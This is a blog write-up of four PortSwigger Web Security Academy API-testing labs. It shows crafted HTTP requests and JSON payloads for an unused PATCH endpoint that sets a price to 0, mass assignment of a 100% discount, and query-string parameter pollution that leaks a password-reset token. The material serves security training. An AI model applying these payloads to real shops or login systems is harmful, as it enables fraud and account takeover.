---
layout: post
title: "API testing - Web Sec academy labs"
pinned: False
---
This post will run through the labs on web sec academy by Portswigger related to API testing.  

### <u>Lab: Exploiting an API endpoint using documentation
Usually API have documentation so that developers can understand how to use it and in this lab through checking endpoints that could have the documentation we find it is in /lab. We see there is a method to delete users and using the API we can get the curl command to delete the user carlos which we can run after logging into our own account.

### <u>Lab: Finding and exploiting an unused API endpoint
Sometimes an endpoint won't be blocked and we can use those to exploit the app. We see an api request is sent when we want to add to cart using the GET method. When we send the same request with the OPTIONS method we get this response:
```
HTTP/2 405 Method Not Allowed
Allow: GET, PATCH
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20

"Method Not Allowed"
```
This shows us that there is only two methods allowed and one which we can use to update. We can log in to our account then try to add the item and capture it's request.
This the original request:
```
GET /api/products/1/price HTTP/2
Host: 0aca0033049985f280c83aba00a8003c.web-security-academy.net
Cookie: session=taQwVVneg8qlpbqy34NYq7bg3jDaeOvO
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aca0033049985f280c83aba00a8003c.web-security-academy.net/product?productId=1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers
```
But we will need to modify it so that it is instead a PATCH method and from a previous response we know that the item has two parameters, price and message. We can instead add json to our request to change the price to 0 and we will have to change the content type header to application/json. This will be our resulting request.
```
PATCH /api/products/1/price HTTP/2
Host: 0aca0033049985f280c83aba00a8003c.web-security-academy.net
Cookie: session=taQwVVneg8qlpbqy34NYq7bg3jDaeOvO
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aca0033049985f280c83aba00a8003c.web-security-academy.net/product?productId=1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers
Content-Type: application/json
Content-Length: 66

{"price":0,"message":"19 people are watching this item right now"}
```
Now this succesfully changes the price of the item and we can add it to our cart and buy it.
### <u>Lab: Exploiting a mass assignment vulnerability
This vulnerability occurs when software frameworks automatically bind request parameters to fields on an internal object. Mass assignment may therefore result in the application supporting parameters that were never intended to be processed by the developer. In this lab we can look through requests to try find any mass assignment, and we see once we add something to our cart and go to the card a GET request is sent to api/checkout and this is the response we get:
```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 153

{"chosen_discount":{"percentage":0},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":133700}]}
```
As you can see above there is a few parameters we can see that we can change to get the product for free, one of these being the perecentage in chosen discount. Now when we click Place Order it sends a POST request to the same endpoint and it is sent with this json:
```
{"chosen_products":[{"product_id":"1","quantity":1}]}
```
We can however change it to the json we recieved in the GET request but with the percentage parameter modified as such:
```
{"chosen_discount":{"percentage":100},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":133700}]}
```
This succesfully allows us to order the product for free.
### <u>Lab: Exploiting server-side parameter pollution in a query string
This vulnerability occurs when a website embeds user input in a server-side request to an internal API without adequate encoding. You can use '#' to truncate a query and '&' to add a paremeter to the query. For this lab as we look around the website we find there is a forgot password feature and when you open this page it also has a forgotPassword.js which by looking through we can see that it sends an email with a reset token and using /forgotpassword?reset_token={the reset token you got} you can reset your password. Now we can also test the POST request that is sent when you submit this form for server side parameter pollution. By adding %23 we can truncate the request in the server side which gives us:
```
"error": "Field not specified."
```
Now by adding a field parameter using %26 we can try set it to a random letter:
```
{"type":"ClientError","code":400,"error":"Invalid field."}
```
Then how about we try reset_token which we could be a field from the javascript file and it gives us:
```
{"result":"k56a6yc05darjqpn1tvhi7i77nq94nld","type":"reset_token"}
```
Now we can use this reset token to change our password and delete users.